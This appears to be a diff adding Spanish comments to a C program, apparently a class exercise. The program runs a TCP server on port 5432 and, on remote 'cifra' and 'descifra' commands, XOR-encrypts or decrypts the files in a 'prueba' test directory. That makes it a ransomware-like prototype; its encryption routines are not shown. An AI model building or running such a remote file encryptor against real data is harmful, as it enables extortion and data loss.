@@ -15,57 +15,64 @@
 #define PORT 5432 // puerto de conexion
 
 int sockfd, new_sockfd;  // descriptores de archivo
-void cifrar(char *archivo);
-void descifrar(char *archivo);
+void cifrar(char *archivo);//funcion cifrar
+void descifrar(char *archivo);//funcion descifrar
 void abrirDirectorio(char *directorio,int cifra);
-void generarllave();
+void generarllave();//funcion generallave
 unsigned char llave[32];
 char llaveXOR;
 
 int main(void){
   struct sockaddr_in host_addr, client_addr;  // Informacion de las direcciones IP
-  socklen_t sin_size;
+  socklen_t sin_size;//variable que contendra la longitud de la estructura
   int recv_length=1, yes=1;
-  char buffer[1024];
+  char buffer[1024];//variable que contendra los mensajes recibidos
 
-  if ((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1)
+  if ((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1)//crea conexion de red
+/* descriptor de archivo igual al valor que retorna la funcion socket
+ donde tenemos tres parametros (dominio,tipo,protocolo)*/
     perror("Error al crear el socket");
 
   if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1)
+/*manipulacion de las opciones del socket (fdsocket,nivel,opcion,parametro,
+tamaño)si el valor retornado es 0 es exitoso*/
     perror("Error al agregar la opcion SO_REUSEADDR en setsockopt");
   
-  host_addr.sin_family = AF_INET;    // 
+  host_addr.sin_family = AF_INET;    //se asigna a la estructura 
   host_addr.sin_port = htons(PORT);  //
-  host_addr.sin_addr.s_addr = INADDR_ANY; // Asigno mi IPP
+  host_addr.sin_addr.s_addr = INADDR_ANY; // Asigno mi IP
   memset(&(host_addr.sin_zero), '\0', 8); // El resto de la estructura en 0s
 
   if (bind(sockfd, (struct sockaddr *)&host_addr, sizeof(struct sockaddr)) == -1)
+/* asignacion de un puerto al socket*/
     perror("Error haciendo el bind");
 
-  if (listen(sockfd, 5) == -1)
+  if (listen(sockfd, 5) == -1)//escucha
     perror("Error al escuchar en el socket");
 
   generarllave();
   while(1) {    // Accept loop
     sin_size = sizeof(struct sockaddr_in);
     new_sockfd = accept(sockfd, (struct sockaddr *)&client_addr, &sin_size);
-    if(new_sockfd == -1)
+/* se espera conexion*/
+    if(new_sockfd == -1)//necesita ser igual a 0 para exito
       perror("Error al aceptar la conexion");
-    send(new_sockfd, ":v\n", 3, 0);
+    send(new_sockfd, ":v\n", 3, 0);//envia socket
     recv_length = recv(new_sockfd, &buffer, 1024, 0);
+//se recibe datos del cliente
     while(recv_length > 0) {
-      if (strcmp(buffer,"cifra\n")==0){
-        send(new_sockfd, "\nllaveXOR: ", 11, 0);
-        send(new_sockfd, &llaveXOR, sizeof(llaveXOR), 0);
+      if (strcmp(buffer,"cifra\n")==0){/*compara las cadenas 0 exito*/
+        send(new_sockfd, "\nllaveXOR: ", 11, 0);//envia un mensaje por medio del socket
+        send(new_sockfd, &llaveXOR, sizeof(llaveXOR), 0);//envia la direccio de la variable llaveXOR
         send(new_sockfd, "\n: ", 1, 0);
         // printf("llaveXOR: %c\n", llaveXOR);
-        abrirDirectorio("prueba",1);
-      }else if(strcmp(buffer,"descifra\n")==0){
-        abrirDirectorio("prueba",0);
+        abrirDirectorio("prueba",1);//llamada de la funcion abrirDirectorio
+      }else if(strcmp(buffer,"descifra\n")==0){//si el mensaje es descifrar
+        abrirDirectorio("prueba",0); 
       }else send(new_sockfd,"\n",1,0);
       recv_length = recv(new_sockfd, &buffer, 1024, 0);
     }
-    close(new_sockfd);
+    close(new_sockfd);//muerte del socket 
   }
   return 0;
 }
